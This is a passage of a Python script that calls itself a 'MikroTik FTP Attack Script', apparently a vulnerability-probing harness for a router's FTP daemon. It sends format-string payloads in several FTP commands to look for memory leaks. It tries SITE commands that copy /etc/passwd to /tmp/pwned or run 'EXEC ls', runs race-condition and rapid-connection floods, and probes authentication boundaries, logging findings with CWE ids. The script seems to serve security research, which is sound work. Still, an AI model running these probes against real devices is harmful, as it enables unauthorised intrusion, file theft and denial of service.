    test_pairs.append(("RNTO_SPECIAL", "%p" * 20))

    test_pairs = test_pairs[:20]

    for cmd, fmt_payload in test_pairs:
        if cmd == "PORT_SPECIAL":
            resps = ftp_auth_raw([f"PORT {fmt_payload}"], timeout=10)
            resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
            test_name = f"PORT format string"
            test_desc = f"Format string in PORT fields: PORT {fmt_payload[:60]}"
        elif cmd == "REST_SPECIAL":
            resps = ftp_auth_raw([f"REST {fmt_payload}"], timeout=10)
            resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
            test_name = f"REST format string"
            test_desc = f"Format string in REST offset: REST {fmt_payload[:60]}"
        elif cmd == "TYPE_SPECIAL":
            resps = ftp_auth_raw([f"TYPE {fmt_payload}"], timeout=10)
            resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
            test_name = f"TYPE format string"
            test_desc = f"Format string in TYPE: TYPE {fmt_payload[:60]}"
        elif cmd == "RNFR_SPECIAL":
            resps = ftp_auth_raw([f"RNFR {fmt_payload}"], timeout=10)
            resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
            test_name = f"RNFR format string"
            test_desc = f"Format string in RNFR: RNFR {fmt_payload[:60]}"
        elif cmd == "RNTO_SPECIAL":
            resps = ftp_auth_raw([f"RNFR test", f"RNTO {fmt_payload}"], timeout=10)
            resp = resps[4] if len(resps) > 4 else (resps[-1] if resps else "NO RESPONSE")
            test_name = f"RNTO format string"
            test_desc = f"Format string in RNTO: RNTO {fmt_payload[:60]}"
        else:
            resps = ftp_auth_raw([f"{cmd} {fmt_payload}"], timeout=10)
            resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
            test_name = f"{cmd} format string"
            test_desc = f"Format string in {cmd}: {cmd} {fmt_payload[:60]}"

        # Detect potential format string information leak
        has_leak = any(marker in resp.lower() for marker in
                       ["0x", "ffff", "bfff", "7fff", "(nil)", "0000"])
        is_crash = resp.startswith("ERROR") or resp == "TIMEOUT"

        ec.add_test("fmtstr", test_name,
                    test_desc,
                    f"Response: {resp[:200].strip()}",
                    {"command": cmd, "format_payload": fmt_payload[:200],
                     "response": resp[:500].strip(),
                     "possible_leak": has_leak, "connection_error": is_crash},
                    anomaly=has_leak or is_crash)

        if has_leak:
            ec.add_finding("HIGH", f"FTP format string leak in {cmd}",
                           f"Format specifiers in {cmd} argument produced response "
                           f"containing potential memory contents",
                           cwe="CWE-134")

        if is_crash and not health_check(f"format string {cmd}"):
            break

    health_check("section 6 complete")


# =============================================================================
# Section 7: Command Injection & Edge Cases (25 tests)
# =============================================================================

def section_7_command_edge_cases():
    log("=" * 60)
    log("Section 7: Command Injection & Edge Cases (25 tests)")
    log("=" * 60)

    # ── SITE commands ────────────────────────────────────────────────────────
    site_cmds = [
        "HELP",
        "CHMOD 777 test",
        "EXEC ls",
        "CPFR /etc/passwd",
        "CPTO /tmp/pwned",
        "UMASK 000",
        "UTIME test",
        "PSWD oldpass newpass",
    ]
    for cmd in site_cmds:
        resps = ftp_auth_raw([f"SITE {cmd}"], timeout=10)
        resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
        code = response_code(resp)
        ec.add_test("edge", f"SITE {cmd.split()[0]}",
                    f"Test SITE command: SITE {cmd}",
                    f"Response: {resp[:200].strip()} (code={code})",
                    {"command": f"SITE {cmd}", "response_code": code,
                     "response": resp[:500].strip()},
                    anomaly=code in (200, 250))

    # ── Unknown/unsupported commands ─────────────────────────────────────────
    unknown_cmds = [
        "XYZZY",
        "CLNT MikroTikTest",
        "OPTS UTF8 ON",
        "HOST test.com",
        "AUTH TLS",
        "PBSZ 0",
        "PROT P",
    ]
    for cmd in unknown_cmds:
        resps = ftp_auth_raw([cmd], timeout=10)
        resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
        code = response_code(resp)
        ec.add_test("edge", f"Unknown cmd: {cmd.split()[0]}",
                    f"Send unsupported/unknown command: {cmd}",
                    f"Response: {resp[:200].strip()} (code={code})",
                    {"command": cmd, "response_code": code,
                     "response": resp[:500].strip()})

    # ── Empty command ────────────────────────────────────────────────────────
    resps = ftp_auth_raw([""], timeout=10)
    resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
    ec.add_test("edge", "Empty command",
                "Send empty line (just CRLF) after authentication",
                f"Response: {resp[:200].strip()}",
                {"response": resp[:500].strip()})

    # ── Commands after QUIT ──────────────────────────────────────────────────
    resps = ftp_auth_raw(["QUIT", "PWD", "LIST"], timeout=10)
    quit_resp = resps[3] if len(resps) > 3 else ""
    post_quit = resps[4] if len(resps) > 4 else "NO RESPONSE (connection closed)"
    ec.add_test("edge", "Commands after QUIT",
                "Send PWD and LIST after QUIT (should fail)",
                f"QUIT resp: {quit_resp[:100].strip()} | Post-QUIT: {post_quit[:100].strip()}",
                {"quit_response": quit_resp[:300].strip(),
                 "post_quit_response": post_quit[:300].strip()},
                anomaly="250" in post_quit or "257" in post_quit)

    # ── Pipelined commands (multiple commands in one send) ───────────────────
    pipeline = f"USER {ADMIN_USER}\r\nPASS {ADMIN_PASS}\r\nPWD\r\nSYST\r\nLIST\r\n"
    resps = ftp_raw_bytes(pipeline.encode())
    all_resp = " | ".join(r[:100].strip() for r in resps)
    ec.add_test("edge", "Pipelined commands",
                "Send 5 commands in a single TCP segment (pipelining)",
                f"Responses: {all_resp[:400]}",
                {"pipeline": pipeline.replace('\r\n', ' | '),
                 "responses": [r[:300].strip() for r in resps]})

    # ── REST with edge values ────────────────────────────────────────────────
    rest_values = [
        ("0", "zero offset"),
        ("-1", "negative offset"),
        ("4294967295", "UINT32_MAX"),
        ("4294967296", "UINT32_MAX + 1"),
        ("9999999999999999999", "huge offset"),
        ("abc", "non-numeric offset"),
    ]
    for value, desc in rest_values:
        resps = ftp_auth_raw([f"REST {value}"], timeout=10)
        resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
        code = response_code(resp)
        ec.add_test("edge", f"REST {desc}",
                    f"REST command with edge-case offset: {value}",
                    f"Response: {resp[:200].strip()} (code={code})",
                    {"value": value, "response_code": code,
                     "response": resp[:500].strip()},
                    anomaly=code == 350 and value.startswith("-"))

    # ── TYPE/STRU/MODE with invalid values ───────────────────────────────────
    type_values = [("A", "ASCII"), ("I", "Image/Binary"), ("E", "EBCDIC"),
                   ("L 8", "Local byte"), ("Z", "Invalid"), ("AA", "Double")]
    for val, desc in type_values:
        resps = ftp_auth_raw([f"TYPE {val}"], timeout=10)
        resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
        code = response_code(resp)
        ec.add_test("edge", f"TYPE {desc}",
                    f"TYPE command with value: {val}",
                    f"Response: {resp[:200].strip()} (code={code})",
                    {"value": val, "response_code": code,
                     "response": resp[:500].strip()})

    for val, desc in [("F", "File"), ("R", "Record"), ("P", "Page"), ("Z", "Invalid")]:
        resps = ftp_auth_raw([f"STRU {val}"], timeout=10)
        resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
        code = response_code(resp)
        ec.add_test("edge", f"STRU {desc}",
                    f"STRU command with value: {val}",
                    f"Response: {resp[:200].strip()} (code={code})",
                    {"value": val, "response_code": code,
                     "response": resp[:500].strip()})

    for val, desc in [("S", "Stream"), ("B", "Block"), ("C", "Compressed"), ("Z", "Invalid")]:
        resps = ftp_auth_raw([f"MODE {val}"], timeout=10)
        resp = resps[3] if len(resps) > 3 else (resps[-1] if resps else "NO RESPONSE")
        code = response_code(resp)
        ec.add_test("edge", f"MODE {desc}",
                    f"MODE command with value: {val}",
                    f"Response: {resp[:200].strip()} (code={code})",
                    {"value": val, "response_code": code,
                     "response": resp[:500].strip()})

    # ── ABOR during transfer attempt ─────────────────────────────────────────
    resps = ftp_auth_raw(["PASV", "LIST", "ABOR"], timeout=10)
    abor_resp = resps[5] if len(resps) > 5 else (resps[-1] if resps else "NO RESPONSE")
    ec.add_test("edge", "ABOR during transfer",
                "Issue ABOR during LIST transfer",
                f"ABOR response: {abor_resp[:200].strip()}",
                {"responses": [r[:200].strip() for r in resps]})

    health_check("section 7 complete")


# =============================================================================
# Section 8: Race Conditions (10 tests)
# =============================================================================

def section_8_race_conditions():
    log("=" * 60)
    log("Section 8: Race Conditions & Concurrency (10 tests)")
    log("=" * 60)

    # ── Concurrent RETR + DELE (TOCTOU) ──────────────────────────────────────
    # First, upload a test file to work with
    try:
        resps = ftp_auth_raw(["PASV"], timeout=10)
        # We can test even without a file — the commands just need to be concurrent
    except:
        pass

    def concurrent_cmds(cmd1, cmd2, desc):
        """Run two FTP commands concurrently from separate connections."""
        results = [None, None]

        def run_cmd(idx, cmd):
            try:
                r = ftp_auth_raw([cmd], timeout=10)
                results[idx] = r
            except Exception as e:
                results[idx] = [f"ERROR: {e}"]

        t1 = threading.Thread(target=run_cmd, args=(0, cmd1))
        t2 = threading.Thread(target=run_cmd, args=(1, cmd2))
        t1.start()
        t2.start()
        t1.join(timeout=15)
        t2.join(timeout=15)

        resp1 = results[0][-1].strip() if results[0] else "THREAD_TIMEOUT"
        resp2 = results[1][-1].strip() if results[1] else "THREAD_TIMEOUT"
        return resp1[:300], resp2[:300]

    # Test 1: Concurrent RETR + DELE on same path
    r1, r2 = concurrent_cmds("RETR test_file", "DELE test_file",
                              "TOCTOU: RETR + DELE")
    ec.add_test("race", "TOCTOU: concurrent RETR + DELE",
                "Race condition: simultaneous RETR and DELE on same file",
                f"RETR: {r1[:150]} | DELE: {r2[:150]}",
                {"retr_response": r1, "dele_response": r2})

    # Test 2: Concurrent RNFR + RNTO from two connections
    r1, r2 = concurrent_cmds("RNFR test_file", "RNFR test_file",
                              "Concurrent RNFR")
    ec.add_test("race", "Concurrent RNFR from two connections",
                "Race: two connections issue RNFR on same file simultaneously",
                f"Conn1: {r1[:150]} | Conn2: {r2[:150]}",
                {"conn1": r1, "conn2": r2})

    # Test 3: Concurrent STOR to same filename
    r1, r2 = concurrent_cmds("STOR race_test", "STOR race_test",
                              "Concurrent STOR")
    ec.add_test("race", "Concurrent STOR to same file",
                "Race: two connections upload to same filename simultaneously",
                f"Conn1: {r1[:150]} | Conn2: {r2[:150]}",
                {"conn1": r1, "conn2": r2})

    # Test 4: Concurrent MKD + RMD on same directory
    r1, r2 = concurrent_cmds("MKD race_dir", "RMD race_dir",
                              "Concurrent MKD + RMD")
    ec.add_test("race", "Concurrent MKD + RMD",
                "Race: simultaneous directory create and remove",
                f"MKD: {r1[:150]} | RMD: {r2[:150]}",
                {"mkd_response": r1, "rmd_response": r2})

    # Test 5: Concurrent CWD + DELE
    r1, r2 = concurrent_cmds("CWD /", "DELE test_file",
                              "Concurrent CWD + DELE")
    ec.add_test("race", "Concurrent CWD + DELE",
                "Race: simultaneous CWD and DELE",
                f"CWD: {r1[:150]} | DELE: {r2[:150]}",
                {"cwd_response": r1, "dele_response": r2})

    # Test 6-8: Rapid connect/disconnect cycling
    log("  Testing rapid connect/disconnect cycling...")
    for cycle_count in [20, 50, 100]:
        successes = 0
        failures = 0
        start = time.time()
        for i in range(cycle_count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((TARGET, FTP_PORT))
                s.recv(1024)
                s.close()
                successes += 1
            except Exception:
                failures += 1
        elapsed = time.time() - start

        ec.add_test("race", f"Rapid connect/disconnect ({cycle_count}x)",
                    f"Rapidly open and close {cycle_count} FTP connections",
                    f"Success: {successes}/{cycle_count} in {elapsed:.1f}s "
                    f"({cycle_count/elapsed:.0f} conn/s)",
                    {"cycle_count": cycle_count, "successes": successes,
                     "failures": failures, "elapsed_s": round(elapsed, 2),
                     "rate_per_sec": round(cycle_count / elapsed, 1)},
                    anomaly=failures > cycle_count * 0.5)

        if not health_check(f"rapid cycling {cycle_count}x"):
            break

    # Test 9: Concurrent auth attempts (10 threads)
    log("  Testing concurrent authentication (10 threads)...")
    auth_results = []

    def auth_attempt(idx):
        try:
            r = ftp_raw([f"USER {ADMIN_USER}", f"PASS {ADMIN_PASS}"], timeout=10)
            auth_results.append({"thread": idx, "success": True,
                                 "response": r[-1][:100].strip() if r else ""})
        except Exception as e:
            auth_results.append({"thread": idx, "success": False, "error": str(e)})

    threads = []
    for i in range(10):
        t = threading.Thread(target=auth_attempt, args=(i,))
        threads.append(t)
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=15)

    successes = sum(1 for r in auth_results if r.get("success"))
    ec.add_test("race", "Concurrent auth (10 threads)",
                "10 simultaneous FTP authentication attempts",
                f"{successes}/10 succeeded",
                {"results": auth_results, "successes": successes},
                anomaly=successes < 5)

    # Test 10: Interleaved auth from two connections
    r1, r2 = concurrent_cmds("PWD", "SYST",
                              "Concurrent post-auth commands")
    ec.add_test("race", "Concurrent post-auth commands",
                "Two authenticated connections running commands simultaneously",
                f"PWD: {r1[:150]} | SYST: {r2[:150]}",
                {"pwd_response": r1, "syst_response": r2})

    health_check("section 8 complete")


# =============================================================================
# Section 9: Pre/Post Authentication Boundary (15 tests)
# =============================================================================

def section_9_auth_boundary():
    log("=" * 60)
    log("Section 9: Pre/Post Authentication Boundary (15 tests)")
    log("=" * 60)

    # ── Commands before USER (should get 530 Not logged in) ──────────────────
    pre_auth_cmds = [
        "PWD", "CWD /", "LIST", "RETR test", "STOR test",
        "MKD test", "DELE test", "SYST", "STAT",
    ]
    for cmd in pre_auth_cmds:
        resps = ftp_raw([cmd], timeout=10)
        resp = resps[1] if len(resps) > 1 else "NO RESPONSE"
        code = response_code(resp)
        # 530 = not logged in, 503 = bad sequence, 500 = unknown = all acceptable
        pre_auth_allowed = code in (150, 200, 213, 226, 250, 257, 211, 212, 215)
        ec.add_test("authboundary", f"Pre-auth: {cmd.split()[0]}",
                    f"Send {cmd} before USER/PASS (should require auth)",
                    f"Response: {resp[:200].strip()} (code={code})",
                    {"command": cmd, "response_code": code,
                     "response": resp[:500].strip(),
                     "allowed_without_auth": pre_auth_allowed},
                    anomaly=pre_auth_allowed)
        if pre_auth_allowed and cmd.split()[0] not in ("SYST", "STAT"):
            ec.add_finding("MEDIUM", f"FTP command allowed pre-auth: {cmd.split()[0]}",
                           f"Command '{cmd}' accepted without authentication (code {code})",
                           cwe="CWE-306")

    # ── Commands after USER but before PASS ──────────────────────────────────
    mid_auth_cmds = ["PWD", "LIST", "CWD /"]
    for cmd in mid_auth_cmds:
        resps = ftp_raw([f"USER {ADMIN_USER}", cmd], timeout=10)
        resp = resps[2] if len(resps) > 2 else "NO RESPONSE"
        code = response_code(resp)
        ec.add_test("authboundary", f"Mid-auth (USER only): {cmd.split()[0]}",
                    f"Send {cmd} after USER but before PASS",
                    f"Response: {resp[:200].strip()} (code={code})",
                    {"command": cmd, "response_code": code,
                     "response": resp[:500].strip()},
                    anomaly=code in (150, 200, 226, 250, 257))

    # ── Commands after failed PASS ───────────────────────────────────────────
    resps = ftp_raw([f"USER {ADMIN_USER}", "PASS wrongpassword", "PWD"], timeout=10)
    resp = resps[3] if len(resps) > 3 else "NO RESPONSE"
    code = response_code(resp)
    ec.add_test("authboundary", "Command after failed PASS",
                "Send PWD after USER + wrong PASS (should require re-auth)",
                f"Response: {resp[:200].strip()} (code={code})",
                {"response_code": code, "response": resp[:500].strip()},
                anomaly=code == 257)

    # ── Re-authentication: USER after already authenticated ──────────────────
    resps = ftp_auth_raw([f"USER {ADMIN_USER}", f"PASS {ADMIN_PASS}", "PWD"], timeout=10)
    # After auth_raw (which adds USER+PASS), we send another USER+PASS+PWD
    reauth_resp = resps[-1] if resps else "NO RESPONSE"
    ec.add_test("authboundary", "Re-authentication (USER after login)",
                "Send USER+PASS again after already authenticated",
                f"Final response: {reauth_resp[:200].strip()}",
                {"responses": [r[:200].strip() for r in resps]})

    # ── REIN (Reinitialize) command ──────────────────────────────────────────
    resps = ftp_auth_raw(["REIN", "PWD"], timeout=10)
    rein_resp = resps[3] if len(resps) > 3 else "NO RESPONSE"
    post_rein = resps[4] if len(resps) > 4 else "NO RESPONSE"
    rein_code = response_code(rein_resp)
    post_code = response_code(post_rein)
    ec.add_test("authboundary", "REIN then PWD",
                "Issue REIN to de-authenticate, then try PWD",
                f"REIN: {rein_resp[:100].strip()} (code={rein_code}) | "
                f"PWD: {post_rein[:100].strip()} (code={post_code})",
                {"rein_code": rein_code, "rein_response": rein_resp[:300].strip(),
                 "post_rein_code": post_code,
                 "post_rein_response": post_rein[:300].strip()},
                anomaly=post_code == 257)  # 257 after REIN means session not cleared

    if post_code == 257:
        ec.add_finding("MEDIUM", "REIN does not clear session state",
                       "After REIN command, PWD still returns valid directory — "
                       "session state not properly reset",
                       cwe="CWE-613")

    # ── ACCT command (account selection) ─────────────────────────────────────
    resps = ftp_auth_raw(["ACCT superuser"], timeout=10)
    resp = resps[3] if len(resps) > 3 else "NO RESPONSE"
    code = response_code(resp)
    ec.add_test("authboundary", "ACCT command",
                "Send ACCT command to test account/privilege selection",
                f"Response: {resp[:200].strip()} (code={code})",
                {"response_code": code, "response": resp[:500].strip()},
                anomaly=code in (200, 202, 230))

    health_check("section 9 complete")


# =============================================================================
# Main
# =============================================================================

def main():
    log(f"MikroTik FTP Attack Script — Target: {TARGET}:{FTP_PORT}")
    log(f"FTP binary: 34KB ELF32 i386, no NX/canary/PIE")
    log("=" * 60)

    # Initial health check
    status = check_router_alive(timeout=10)
    if not status.get("alive"):
        log(f"ERROR: Router {TARGET} is not responding. Aborting.")
        sys.exit(1)
    log(f"Router alive: version={status.get('version')}, uptime={status.get('uptime')}")

    # Verify FTP port is open
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET, FTP_PORT))
        banner = s.recv(1024).decode("utf-8", errors="replace").strip()
        s.close()
        log(f"FTP service confirmed: {banner}")
    except Exception as e:
        log(f"ERROR: Cannot connect to FTP at {TARGET}:{FTP_PORT}: {e}")
        sys.exit(1)

    # Pull pre-test logs
    pull_logs_before_destructive_action("ftpd_attack_start")

    # Run all 9 sections
    section_1_authentication()
    section_2_command_overflow()
    section_3_path_traversal()
    section_4_sensitive_file_bypass()
    section_5_bounce_data()
    section_6_format_string()
    section_7_command_edge_cases()
    section_8_race_conditions()
    section_9_auth_boundary()

    # Save evidence and summarize
    ec.save("attack_ftpd.json")
    ec.summary()

    # Print findings summary
    findings = ec.results["findings"]
    if findings:
        log("")
        log(f"FINDINGS SUMMARY ({len(findings)} total):")
        for f in findings:
            log(f"  [{f['severity']}] {f['title']}")
    else:
        log("")
        log("No security findings recorded.")


if __name__ == "__main__":
    os.chdir(BASE_DIR)
    main()
